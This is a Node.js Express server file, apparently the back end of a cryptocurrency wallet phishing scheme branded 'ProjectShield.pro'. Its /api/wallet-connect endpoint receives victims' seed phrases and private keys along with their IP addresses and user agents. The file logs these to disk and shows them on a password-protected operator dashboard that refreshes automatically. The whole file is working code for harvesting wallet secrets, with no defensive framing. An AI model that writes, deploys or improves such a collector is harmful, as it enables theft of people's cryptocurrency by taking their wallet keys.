const express = require('express');
const cors = require('cors');
const fs = require('fs');
const path = require('path');
const basicAuth = require('express-basic-auth');

const app = express();
const PORT = process.env.PORT || 3000;

// Configure your password here
const DASHBOARD_PASSWORD = 'eBENZ35000$$'; // Change this to your desired password

// Middleware
app.use(cors()); // you can restrict origin later
app.use(express.json());

// Password protection middleware for dashboard
const authMiddleware = basicAuth({
    users: { 'admin': DASHBOARD_PASSWORD },
    challenge: true,
    realm: 'ProjectShield.pro Dashboard'
});

// Create logs directory if it doesn't exist
const logsDir = path.join(__dirname, 'wallet_logs');
if (!fs.existsSync(logsDir)) {
    fs.mkdirSync(logsDir);
}

// Store wallet connections in memory
const walletConnections = [];

// POST endpoint to collect wallet info
app.post('/api/wallet-connect', (req, res) => {
    try {
        const {
            inputType,
            inputValue,
            seedPhrase,
            privateKey,
            walletType,
            timestamp,
            userAgent,
            ipAddress
        } = req.body;

        const connectionData = {
            id: Date.now().toString(),
            inputType,
            inputValue,
            seedPhrase: seedPhrase || null,
            privateKey: privateKey || null,
            walletType,
            timestamp,
            userAgent,
            ipAddress,
            receivedAt: new Date().toISOString()
        };

        walletConnections.push(connectionData);

        const logEntry = `
=== WALLET CONNECTION ===
ID: ${connectionData.id}
Wallet Type: ${walletType}
Input Type: ${inputType}
${inputType === 'seedPhrase' ? 'Seed Phrase' : 'Private Key'}: ${inputValue}
Timestamp: ${timestamp}
User Agent: ${userAgent}
IP Address: ${ipAddress}
Received At: ${connectionData.receivedAt}
========================

`;

        const logFile = path.join(logsDir, `wallet_log_${new Date().toISOString().split('T')[0]}.txt`);
        fs.appendFileSync(logFile, logEntry);

        console.log('New wallet connection recorded:', connectionData.id);

        res.json({
            success: true,
            message: 'Wallet connection recorded',
            connectionId: connectionData.id
        });

    } catch (error) {
        console.error('Error processing wallet connection:', error);
        res.status(500).json({
            success: false,
            message: 'Server error'
        });
    }
});

// Get all connections (protected)
app.get('/api/wallet-connections', authMiddleware, (req, res) => {
    res.json({
        success: true,
        total: walletConnections.length,
        connections: walletConnections
    });
});

// Filter by wallet type (protected)
app.get('/api/wallet-connections/:walletType', authMiddleware, (req, res) => {
    const { walletType } = req.params;
    const filtered = walletConnections.filter(conn =>
        conn.walletType.toLowerCase() === walletType.toLowerCase()
    );

    res.json({
        success: true,
        walletType,
        total: filtered.length,
        connections: filtered
    });
});

// Dashboard (protected)
app.get('/', authMiddleware, (req, res) => {
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Wallet Connections Dashboard</title>
        <style>
            body { font-family: Arial, sans-serif; margin: 40px; }
            .connection { border: 1px solid #ddd; padding: 15px; margin: 10px 0; border-radius: 5px; }
            .seed-phrase { background: #f5f5f5; padding: 10px; font-family: monospace; word-break: break-word; }
            .timestamp { color: #666; font-size: 0.9em; }
            .wallet-type { font-weight: bold; color: #2c3e50; }
            .logout { position: absolute; top: 20px; right: 20px; }
        </style>
    </head>
    <body>
        <h1>Wallet Connections Dashboard</h1>
        <a href="/logout" class="logout">Logout</a>
        <p>Total connections: <strong>${walletConnections.length}</strong></p>
        <div id="connections">
            ${walletConnections.map(conn => `
                <div class="connection">
                    <div class="wallet-type">Wallet: ${conn.walletType}</div>
                    <div class="timestamp">Time: ${conn.timestamp}</div>
                    <div class="timestamp">IP: ${conn.ipAddress}</div>
                    <div class="timestamp">Input Type: <strong>${conn.inputType}</strong></div>
                    <div>${conn.inputType === 'seedPhrase' ? 'Seed Phrase:' : 'Private Key:'}</div>
                    <div class="seed-phrase">${conn.inputValue}</div>
                </div>
            `).join('')}
        </div>
        <script>
            setTimeout(() => location.reload(), 10000);
        </script>
    </body>
    </html>
    `;
    res.send(html);
});

// Logout route
app.get('/logout', (req, res) => {
    res.set('WWW-Authenticate', 'Basic realm="ProjectShield.pro Dashboard"');
    res.status(401).send('Logged out successfully. Refresh to login again.');
});

// Start server
app.listen(PORT, () => {
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`🌐 Dashboard: http://localhost:${PORT} OR your Render URL`);
    console.log(`🔒 Password protected - username: admin, password: ${DASHBOARD_PASSWORD}`);
    console.log(`📩 API: POST /api/wallet-connect`);
});